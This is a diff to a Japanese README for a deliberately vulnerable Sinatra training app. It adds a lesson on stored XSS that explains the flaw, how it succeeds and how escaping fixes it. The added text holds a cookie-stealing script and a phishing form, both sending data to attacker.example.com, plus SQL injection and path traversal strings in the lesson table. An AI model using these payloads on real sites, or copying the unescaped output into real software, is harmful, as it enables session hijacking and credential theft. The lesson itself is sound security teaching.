@@ -43,7 +43,7 @@ http://localhost:4567 にアクセス。
 | 回 | 機能 | 脆弱性 | 攻撃例 | 状態 |
 |----|------|--------|--------|------|
 | 1 | ログイン | SQLインジェクション | `' OR 1=1 --` でログイン突破 | 実装済み |
-| 2 | 投稿表示 | XSS | `<script>alert('XSS')</script>` を投稿 | 未実装 |
+| 2 | 投稿表示 | XSS | `<script>alert('XSS')</script>` を投稿 | 実装済み |
 | 3 | 投稿削除 | CSRF | 罠サイトから他人の投稿を削除 | 未実装 |
 | 4 | アイコンアップロード | ディレクトリトラバーサル | `../../etc/passwd` 的なファイル名 | 未実装 |
 | 5 | セッション管理 | 認証の不備 | 推測可能なセッションID | 未実装 |
@@ -86,6 +86,84 @@ user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", [us
 ```
 
 ユーザー入力がSQL構文として解釈されなくなるため、インジェクションが成立しない。
+
+## 第2回: XSS（クロスサイトスクリプティング）
+
+### 脆弱な箇所
+
+`views/posts.erb` の投稿表示で、ユーザー入力をエスケープせずにHTMLに出力している。
+
+```erb
+<%# 脆弱なコード — エスケープなしで出力 %>
+<div class="post-body"><%= post['body'] %></div>
+```
+
+SinatraのERBでは `<%= ... %>` はHTMLエスケープを**行わない**。そのため、投稿に含まれる `<script>` タグなどがそのままブラウザで実行される。
+
+> **注意**: Ruby on Railsでは `<%= ... %>` は自動エスケープされるが、素のERB（Sinatra）では自動エスケープされない。
+
+### 攻撃してみる
+
+1. http://localhost:4567/login にアクセスし、ログイン
+2. 投稿欄に `<script>alert('XSS')</script>` と入力して投稿
+3. **アラートが表示される** = XSS脆弱性が存在する
+
+### 攻撃のバリエーション
+
+**Cookie窃取（セッションハイジャック）:**
+
+```html
+<script>new Image().src='http://attacker.example.com/steal?cookie='+document.cookie;</script>
+```
+
+攻撃者のサーバーに被害者のセッションCookieが送信され、なりすましが可能になる。
+
+**偽のログインフォーム表示（フィッシング）:**
+
+```html
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
+  <h1>セッションが切れました。再ログインしてください。</h1>
+  <form action="http://attacker.example.com/phish" method="post">
+    <input name="username" placeholder="ユーザー名">
+    <input name="password" type="password" placeholder="パスワード">
+    <button type="submit">ログイン</button>
+  </form>
+</div>
+```
+
+### 仕組み（なぜ成功するか）
+
+```
+1. 攻撃者が <script>悪意のあるコード</script> を投稿
+2. DBにそのまま保存される（エスケープなし）
+3. 他のユーザーが投稿一覧ページを閲覧
+4. サーバーが <%= post['body'] %> でHTMLに埋め込む（エスケープなし）
+5. ブラウザが <script> タグを正規のスクリプトとして実行
+   → Cookie漏洩、画面改ざん、リダイレクトなどが起きる
+```
+
+このタイプのXSSは**格納型XSS（Stored XSS）**と呼ばれる。DBに保存されたスクリプトが閲覧者全員に影響する、最も危険なXSSの一種。
+
+### 防御方法
+
+出力時にHTMLの特殊文字をエスケープする：
+
+```erb
+<%# 安全なコード — エスケープして出力 %>
+<div class="post-body"><%= Rack::Utils.escape_html(post['body']) %></div>
+```
+
+エスケープにより、特殊文字が無害な文字列に変換される：
+
+| 元の文字 | エスケープ後 |
+|---------|------------|
+| `<` | `&lt;` |
+| `>` | `&gt;` |
+| `"` | `&quot;` |
+| `'` | `&#x27;` |
+| `&` | `&amp;` |
+
+`<script>` は `&lt;script&gt;` となり、ブラウザには「タグ」ではなく「文字列」として表示される。
 
 ## ディレクトリ構成
 
